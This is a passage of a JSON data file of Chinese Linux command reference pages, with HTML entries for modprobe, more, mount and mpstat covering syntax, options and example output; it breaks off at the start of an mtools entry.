        "body": "<h1 id=\"modprobe\">modprobe</h1>\n<p>自动处理可载入模块</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>modprobe命令</strong> 用于智能地向内核中加载模块或者从内核中移除模块。</p>\n<p>modprobe可载入指定的个别模块，或是载入一组相依的模块。modprobe会根据depmod所产生的相依关系，决定要载入哪些模块。若在载入过程中发生错误，在modprobe会卸载整组的模块。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">modprobe</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a或--all：载入全部的模块；</span>\n<span class=\"hljs-deletion\">-c或--show-conf：显示所有模块的设置信息；</span>\n<span class=\"hljs-deletion\">-d或--debug：使用排错模式；</span>\n<span class=\"hljs-deletion\">-l或--list：显示可用的模块；</span>\n<span class=\"hljs-deletion\">-r或--remove：模块闲置不用时，即自动卸载模块；</span>\n<span class=\"hljs-deletion\">-t或--type：指定模块类型；</span>\n<span class=\"hljs-deletion\">-v或--verbose：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">-V或--version：显示版本信息；</span>\n<span class=\"hljs-deletion\">-help：显示帮助。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>模块名：要加载或移除的模块名称。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>查看modules的配置文件：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">modprobe -c</span>\n</code></pre>\n<p>这里，可以查看modules的配置文件，比如模块的alias别名是什么等。会打印许多行信息，例如其中的一行会类似如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">alias</span> symbol:ip_conntrack_unregister_notifier ip_conntrack\n</code></pre>\n<p> <strong>列出内核中所有已经或者未挂载的所有模块：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">modprobe -l</span>\n</code></pre>\n<p>这里，我们能查看到我们所需要的模块，然后根据我们的需要来挂载；其实<code>modprobe -l</code>读取的模块列表就位于/lib/modules/`uname -r `目录中；其中<code>uname -r</code>是内核的版本，例如输出结果的其中一行是：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/lib/m</span>odules<span class=\"hljs-regexp\">/2.6.18-348.6.1.el5/</span>kernel<span class=\"hljs-regexp\">/net/</span>netfilter/xt_statistic.ko\n</code></pre>\n<p> <strong>挂载vfat模块：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">modprobe vfat</span>\n</code></pre>\n<p>这里，使用格式<code>modprobe 模块名</code>来挂载一个模块。挂载之后，用lsmod可以查看已经挂载的模块。模块名是不能带有后缀的，我们通过<code>modprobe -l</code>所看到的模块，都是带有<code>.ko</code>或<code>.o</code>后缀。</p>\n<p> <strong>移除已经加载的模块：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">modprobe</span> -r 模块名\n</code></pre>\n<p>这里，移除已加载的模块，和rmmod功能相同。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "more",
        "des": "显示文件内容，每次显示一屏",
        "body": "<h1 id=\"more\">more</h1>\n<p>显示文件内容，每次显示一屏</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>more命令</strong> 是一个基于vi编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持vi中的关键字定位操作。more名单中内置了若干快捷键，常用的有H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。</p>\n<p>该命令一次显示一屏文本，满屏后停下来，并且在屏幕的底部出现一个提示信息，给出至今己显示的该文件的百分比：--More--（XX%）可以用下列不同的方法对提示做出回答：</p>\n<ul>\n<li>  按 <code>Space</code> 键：显示文本的下一屏内容。</li>\n<li>  按 <code>Enter</code> 键：只显示文本的下一行内容。</li>\n<li>  按斜线符<code>|</code>：接着输入一个模式，可以在文本中寻找下一个相匹配的模式。</li>\n<li>  按H键：显示帮助屏，该屏上有相关的帮助信息。</li>\n<li>  按B键：显示上一屏内容。</li>\n<li>  按Q键：退出more命令。</li>\n</ul>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">more</span><span class=\"hljs-params\">(语法)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-&lt;数字&gt;：指定每屏显示的行数；</span>\n<span class=\"hljs-deletion\">-d：显示“[press space to continue,'q' to quit.]”和“[Press 'h' for instructions]”；</span>\n<span class=\"hljs-deletion\">-c：不进行滚屏操作。每次刷新这个屏幕；</span>\n<span class=\"hljs-deletion\">-s：将多个空行压缩成一行显示；</span>\n<span class=\"hljs-deletion\">-u：禁止下划线；</span>\n<span class=\"hljs-addition\">+&lt;数字&gt;：从指定数字的行开始显示。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定分页显示内容的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>显示文件file的内容，但在显示之前先清屏，并且在屏幕的最下方显示完成的百分比。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">more</span> -dc <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>显示文件file的内容，每10行显示一次，而且在显示之前先清屏。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">more</span> -c -10 <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "mount",
        "des": "用于挂载Linux系统外的文件",
        "body": "<h1 id=\"mount\">mount</h1>\n<p>用于挂载Linux系统外的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mount命令</strong> Linux mount命令是经常会使用到的命令，它用于挂载Linux系统外的文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">mount <span class=\"hljs-comment\">[-hV]</span>\nmount -a <span class=\"hljs-comment\">[-fFnrsvw]</span> <span class=\"hljs-comment\">[-t vfstype]</span>\nmount <span class=\"hljs-comment\">[-fnrsvw]</span> <span class=\"hljs-comment\">[-o options <span class=\"hljs-comment\">[,...]</span>]</span> device | dir\nmount <span class=\"hljs-comment\">[-fnrsvw]</span> <span class=\"hljs-comment\">[-t vfstype]</span> <span class=\"hljs-comment\">[-o options]</span> device dir\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-V：显示程序版本</span>\n<span class=\"hljs-deletion\">-h：显示辅助讯息</span>\n<span class=\"hljs-deletion\">-v：显示较讯息，通常和 -f 用来除错。</span>\n<span class=\"hljs-deletion\">-a：将 /etc/fstab 中定义的所有档案系统挂上。</span>\n<span class=\"hljs-deletion\">-F：这个命令通常和 -a 一起使用，它会为每一个 mount 的动作产生一个行程负责执行。在系统需要挂上大量 NFS 档案系统时可以加快挂上的动作。</span>\n<span class=\"hljs-deletion\">-f：通常用在除错的用途。它会使 mount 并不执行实际挂上的动作，而是模拟整个挂上的过程。通常会和 -v 一起使用。</span>\n<span class=\"hljs-deletion\">-n：一般而言，mount 在挂上后会在 /etc/mtab 中写入一笔资料。但在系统中没有可写入档案系统存在的情况下可以用这个选项取消这个动作。</span>\n<span class=\"hljs-deletion\">-s-r：等于 -o ro</span>\n<span class=\"hljs-deletion\">-w：等于 -o rw</span>\n<span class=\"hljs-deletion\">-L：将含有特定标签的硬盘分割挂上。</span>\n<span class=\"hljs-deletion\">-U：将档案分割序号为 的档案系统挂下。-L 和 -U 必须在/proc/partition 这种档案存在时才有意义。</span>\n<span class=\"hljs-deletion\">-t：指定档案系统的型态，通常不必指定。mount 会自动选择正确的型态。</span>\n<span class=\"hljs-deletion\">-o async：打开非同步模式，所有的档案读写动作都会用非同步模式执行。</span>\n<span class=\"hljs-deletion\">-o sync：在同步模式下执行。</span>\n<span class=\"hljs-deletion\">-o atime、-o noatime：当 atime 打开时，系统会在每次读取档案时更新档案的『上一次调用时间』。当我们使用 flash 档案系统时可能会选项把这个选项关闭以减少写入的次数。</span>\n<span class=\"hljs-deletion\">-o auto、-o noauto：打开/关闭自动挂上模式。</span>\n<span class=\"hljs-deletion\">-o defaults:使用预设的选项 rw, suid, dev, exec, auto, nouser, and async.</span>\n<span class=\"hljs-deletion\">-o dev、-o nodev-o exec、-o noexec允许执行档被执行。</span>\n<span class=\"hljs-deletion\">-o suid、-o nosuid：</span>\n允许执行档在 root 权限下执行。\n<span class=\"hljs-deletion\">-o user、-o nouser：使用者可以执行 mount/umount 的动作。</span>\n<span class=\"hljs-deletion\">-o remount：将一个已经挂下的档案系统重新用不同的方式挂上。例如原先是唯读的系统，现在用可读写的模式重新挂上。</span>\n<span class=\"hljs-deletion\">-o ro：用唯读模式挂上。</span>\n<span class=\"hljs-deletion\">-o rw：用可读写模式挂上。</span>\n<span class=\"hljs-deletion\">-o loop=：使用 loop 模式用来将一个档案当成硬盘分割挂上系统。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>将 <code>/dev/hda1</code> 挂在 <code>/mnt</code> 之下。</p>\n<pre><code class=\"language-shell\">#mount <span class=\"hljs-regexp\">/dev/</span>hda1 /mnt\n</code></pre>\n<p>将 <code>/dev/hda1</code> 用唯读模式挂在 <code>/mnt</code> 之下。</p>\n<pre><code class=\"language-shell\">#mount -o ro <span class=\"hljs-regexp\">/dev/</span>hda1 /mnt\n</code></pre>\n<p>将 <code>/tmp/image.iso</code> 这个光碟的 <code>image</code> 档使用 <code>loop</code> 模式挂在 <code>/mnt/cdrom</code> 之下。用这种方法可以将一般网络上可以找到的 <code>Linux</code> 光 碟 ISO 档在不烧录成光碟的情况下检视其内容。</p>\n<pre><code class=\"language-shell\">#mount -o loop <span class=\"hljs-regexp\">/tmp/im</span>age.iso <span class=\"hljs-regexp\">/mnt/</span>cdrom\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "mpstat",
        "des": "显示各个可用CPU的状态",
        "body": "<h1 id=\"mpstat\">mpstat</h1>\n<p>显示各个可用CPU的状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mpstat命令</strong> 指令主要用于多CPU环境下，它显示各个可用CPU的状态系你想。这些信息存放在<code>/proc/stat</code>文件中。在多CPUs系统里，其不但能查看所有CPU的平均状况信息，而且能够查看特定CPU的信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mpstat</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">P</span>：指定CPU编号。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  间隔时间：每次报告的间隔时间（秒）；</li>\n<li>  次数：显示报告的次数。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>当mpstat不带参数时，输出为从系统启动以来的平均值。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mpstat</span>\n<span class=\"hljs-attribute\">Linux</span> <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">9</span>-<span class=\"hljs-number\">5</span>.<span class=\"hljs-number\">31</span>AXsmp (builder.redflag-linux.com) <span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">16</span>/<span class=\"hljs-number\">2005</span>\n<span class=\"hljs-attribute\">09</span>:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">46</span> AM CPU %user %nice %system %iowait %irq %soft %idle intr/s\n<span class=\"hljs-attribute\">09</span>:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">48</span> AM <span class=\"hljs-literal\">all</span> <span class=\"hljs-number\">23</span>.<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">75</span>     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">50</span> <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">74</span>.<span class=\"hljs-number\">47</span> <span class=\"hljs-number\">1018</span>.<span class=\"hljs-number\">59</span>\n</code></pre>\n<p> <strong>每2秒产生了2个处理器的统计数据报告：</strong> </p>\n<p>下面的命令可以每2秒产生了2个处理器的统计数据报告，一共产生三个interval 的信息，然后再给出这三个interval的平均信息。默认时，输出是按照CPU 号排序。第一个行给出了从系统引导以来的所有活跃数据。接下来每行对应一个处理器的活跃状态。。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mpstat</span> -P <span class=\"hljs-literal\">ALL</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">Linux</span> <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">18</span>-<span class=\"hljs-number\">164</span>.el5 (server.sys.com)    <span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">04</span>/<span class=\"hljs-number\">2010</span>\n<span class=\"hljs-attribute\">09</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">20</span> PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n<span class=\"hljs-attribute\">09</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">22</span> PM <span class=\"hljs-literal\">all</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">100</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">1001</span>.<span class=\"hljs-number\">49</span>\n<span class=\"hljs-attribute\">09</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">22</span> PM    <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">50</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">99</span>.<span class=\"hljs-number\">50</span>   <span class=\"hljs-number\">1001</span>.<span class=\"hljs-number\">00</span>\n<span class=\"hljs-attribute\">09</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">22</span> PM    <span class=\"hljs-number\">1</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">100</span>.<span class=\"hljs-number\">00</span>      <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>\n</code></pre>\n<p> <strong>比较带参数和不带参数的mpstat的结果：</strong> </p>\n<p>在后台开一个2G的文件</p>\n<pre><code class=\"language-shell\">cat <span class=\"hljs-number\">1</span>.img <span class=\"hljs-meta\">&amp;</span>\n</code></pre>\n<p>然后在另一个终端运行mpstat命令</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mpstat</span>\n<span class=\"hljs-attribute\">Linux</span> <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">18</span>-<span class=\"hljs-number\">164</span>.el5 (server.sys.com)    <span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">04</span>/<span class=\"hljs-number\">2010</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">31</span> PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">31</span> PM <span class=\"hljs-literal\">all</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">07</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">02</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">25</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">21</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">04</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">99</span>.<span class=\"hljs-number\">40</span>   <span class=\"hljs-number\">1004</span>.<span class=\"hljs-number\">57</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mpstat</span>\n<span class=\"hljs-attribute\">Linux</span> <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">18</span>-<span class=\"hljs-number\">164</span>.el5 (server.sys.com)    <span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">04</span>/<span class=\"hljs-number\">2010</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">35</span> PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">35</span> PM <span class=\"hljs-literal\">all</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">07</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">02</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">25</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">21</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">04</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">99</span>.<span class=\"hljs-number\">39</span>   <span class=\"hljs-number\">1004</span>.<span class=\"hljs-number\">73</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mpstat</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">10</span>\n<span class=\"hljs-attribute\">Linux</span> <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">18</span>-<span class=\"hljs-number\">164</span>.el5 (server.sys.com)    <span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">04</span>/<span class=\"hljs-number\">2010</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">55</span> PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">58</span> PM <span class=\"hljs-literal\">all</span>   <span class=\"hljs-number\">13</span>.<span class=\"hljs-number\">12</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">20</span>.<span class=\"hljs-number\">93</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">83</span>    <span class=\"hljs-number\">9</span>.<span class=\"hljs-number\">80</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">54</span>.<span class=\"hljs-number\">32</span>   <span class=\"hljs-number\">2488</span>.<span class=\"hljs-number\">08</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">01</span> PM <span class=\"hljs-literal\">all</span>   <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">82</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">19</span>.<span class=\"hljs-number\">30</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">83</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">83</span>    <span class=\"hljs-number\">9</span>.<span class=\"hljs-number\">32</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">57</span>.<span class=\"hljs-number\">90</span>   <span class=\"hljs-number\">2449</span>.<span class=\"hljs-number\">83</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">04</span> PM <span class=\"hljs-literal\">all</span>   <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">95</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">20</span>.<span class=\"hljs-number\">40</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">17</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">99</span>    <span class=\"hljs-number\">8</span>.<span class=\"hljs-number\">62</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">57</span>.<span class=\"hljs-number\">88</span>   <span class=\"hljs-number\">2384</span>.<span class=\"hljs-number\">05</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">07</span> PM <span class=\"hljs-literal\">all</span>   <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">47</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">18</span>.<span class=\"hljs-number\">11</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">50</span>    <span class=\"hljs-number\">8</span>.<span class=\"hljs-number\">47</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">61</span>.<span class=\"hljs-number\">46</span>   <span class=\"hljs-number\">2416</span>.<span class=\"hljs-number\">00</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">10</span> PM <span class=\"hljs-literal\">all</span>   <span class=\"hljs-number\">11</span>.<span class=\"hljs-number\">81</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">22</span>.<span class=\"hljs-number\">63</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">83</span>   <span class=\"hljs-number\">11</span>.<span class=\"hljs-number\">98</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">51</span>.<span class=\"hljs-number\">75</span>   <span class=\"hljs-number\">2210</span>.<span class=\"hljs-number\">60</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">13</span> PM <span class=\"hljs-literal\">all</span>    <span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">31</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">80</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">5</span>.<span class=\"hljs-number\">32</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">76</span>.<span class=\"hljs-number\">58</span>   <span class=\"hljs-number\">1795</span>.<span class=\"hljs-number\">33</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">19</span> PM <span class=\"hljs-literal\">all</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">75</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">16</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">75</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">25</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">25</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">92</span>.<span class=\"hljs-number\">85</span>   <span class=\"hljs-number\">1245</span>.<span class=\"hljs-number\">18</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">22</span> PM <span class=\"hljs-literal\">all</span>   <span class=\"hljs-number\">11</span>.<span class=\"hljs-number\">94</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">19</span>.<span class=\"hljs-number\">07</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">99</span>    <span class=\"hljs-number\">8</span>.<span class=\"hljs-number\">29</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">58</span>.<span class=\"hljs-number\">71</span>   <span class=\"hljs-number\">2630</span>.<span class=\"hljs-number\">46</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">25</span> PM <span class=\"hljs-literal\">all</span>   <span class=\"hljs-number\">11</span>.<span class=\"hljs-number\">65</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">19</span>.<span class=\"hljs-number\">30</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">50</span>    <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">00</span>    <span class=\"hljs-number\">9</span>.<span class=\"hljs-number\">15</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">57</span>.<span class=\"hljs-number\">40</span>   <span class=\"hljs-number\">2673</span>.<span class=\"hljs-number\">91</span>\n<span class=\"hljs-attribute\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">28</span> PM <span class=\"hljs-literal\">all</span>   <span class=\"hljs-number\">11</span>.<span class=\"hljs-number\">44</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">21</span>.<span class=\"hljs-number\">06</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">33</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">99</span>   <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">61</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">54</span>.<span class=\"hljs-number\">56</span>   <span class=\"hljs-number\">2369</span>.<span class=\"hljs-number\">87</span>\n<span class=\"hljs-attribute\">Average</span>:     <span class=\"hljs-literal\">all</span>    <span class=\"hljs-number\">9</span>.<span class=\"hljs-number\">27</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">16</span>.<span class=\"hljs-number\">18</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">30</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">50</span>    <span class=\"hljs-number\">7</span>.<span class=\"hljs-number\">64</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>   <span class=\"hljs-number\">65</span>.<span class=\"hljs-number\">11</span>   <span class=\"hljs-number\">2173</span>.<span class=\"hljs-number\">54</span>\n</code></pre>\n<p>上两表显示出当要正确反映系统的情况，需要正确使用命令的参数。vmstat 和iostat 也需要注意这一问题。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mtools",
        "des": "显示mtools支持的指令",
